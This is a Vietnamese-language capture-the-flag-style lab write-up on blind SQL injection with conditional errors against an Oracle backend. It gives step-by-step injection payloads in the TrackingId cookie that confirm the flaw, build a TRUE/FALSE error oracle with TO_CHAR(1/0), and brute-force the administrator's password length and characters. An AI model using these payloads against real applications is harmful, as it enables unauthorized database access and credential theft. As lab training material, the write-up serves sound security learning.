<h1>Blind SQL injection with conditional errors</h1>
<hr>
<h2>1. Chặn request và tìm TrackingId</h2>

<h2>2. Xác nhận SQL syntax error (không phải lỗi khác)</h2>
<p>Ta thử khai thác Conditional Responses (lab 9) để thấy web không thay đổi gì dù query trả về có/không có dữ liệu.</p>
<p>
  <img width="1027" height="567" alt="image" src="https://github.com/user-attachments/assets/e623b874-5e8c-4e2b-9e1e-d35045e169b9" />
<img width="1026" height="568" alt="image" src="https://github.com/user-attachments/assets/8972cb66-d927-41aa-8242-a3b518ec299b" />

</p>
<p>Nó không còn hiện "Welcome back" như lab trước, vậy nên ta phải sử dụng cách khác.</p>
<p>Ta sẽ chèn những payload khiến web bị lỗi:</p>
<pre>TrackingId=xyz'</pre>
<p>Một nháy đơn sẽ phá cú pháp SQL nếu TrackingId được nhúng vào query dạng: <code>... WHERE id='xyz' ...</code> → gây lỗi SQL.</p>
<pre>TrackingId=xyz''</pre>
<p>Hai nháy đơn là chuỗi nháy đơn escape hợp lệ trong SQL. Nếu 1 dấu gây lỗi nhưng 2 dấu không gây lỗi, chứng minh lỗi vừa rồi là SQL syntax error thật, không phải lỗi khác.</p>
<p>
  <img width="1028" height="569" alt="image" src="https://github.com/user-attachments/assets/a2e8e301-c1a9-43ad-9237-7c9501167521" />
<img width="1026" height="567" alt="image" src="https://github.com/user-attachments/assets/4483b3b3-c755-4d91-8b77-ebf74e8aeec5" />

</p>


<h2>3. Xác nhận DB ENGINE + SYNTAX nối chuỗi</h2>
<p>Bắt đầu thử inject một SELECT đơn giản.</p>
<pre>xyz'||(SELECT '')||'</pre>
<ul>
  <li>Kiểm tra DB cho phép <code>(SELECT '')</code> không. Nếu là Oracle, nó sẽ báo lỗi vì thiếu <code>FROM</code>.</li>
</ul>
<p>Tiếp tục thử SELECT có FROM dual</p>
<pre>xyz'||(SELECT '' FROM dual)||'</pre>
<ul>
  <li>Không lỗi → Database = Oracle và syntax nối chuỗi = <code>||</code></li>
  <li>Subquery được thực thi → inject thành công</li>
</ul>


<h2>4. Xác nhận query thực sự được thực thi và subquery hoạt động</h2>
<p>Ta gây lỗi bằng bảng không tồn tại:</p>
<pre>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</pre>
<p>
<img width="1027" height="570" alt="image" src="https://github.com/user-attachments/assets/933b5965-c621-4652-ab41-2db8091db86b" />

</p>
<ul>
  <li>Lỗi → chứng minh phần inject được thực thi dưới dạng SQL thật (không bị filter).</li>
<li>Đây là test “execution-based”, quan trọng hơn syntax test.</li>
</ul>

<h2>5. Kiểm tra bảng <code>users</code></h2>
<pre>TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'</pre>
<ul>
  <li>Không lỗi → bảng users tồn tại.</li>
  <li>ROWNUM=1 tránh SELECT trả nhiều dòng.</li>
</ul>
<p>
  <img width="1027" height="568" alt="image" src="https://github.com/user-attachments/assets/e2637eef-db4c-4400-928e-fc58544dd721" />

</p>

<h2>6. Tạo kênh truyền tín hiệu TRUE/FALSE</h2>
<p><b>Test TRUE</b>:</p>
<pre>xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</pre>
<p><b>Test FALSE</b>:</p>
<pre>xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</pre>


<h2>7. Kiểm tra có user administrator không</h2>
<pre>xyz'||(SELECT CASE WHEN (username='administrator') 
THEN TO_CHAR(1/0) ELSE '' END FROM users)||'</pre>
<p>Lỗi → username tồn tại.</p>
<p>
  <img width="1027" height="570" alt="image" src="https://github.com/user-attachments/assets/89e022b7-b6d4-4725-b46a-952817a18282" />

</p>

<h2>8. Tìm chiều dài password</h2>
<pre>xyz'||(SELECT CASE WHEN LENGTH(password)>1 
THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'</pre>
<p>
<img width="1028" height="570" alt="image" src="https://github.com/user-attachments/assets/2ec7f630-76e0-4df7-befe-6cb229acc08a" />
  
</p>

<h2>9. Buteforce từng kí tự</h2>
<pre>xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' 
THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'</pre>
(dùng intruder trong burpsuite)
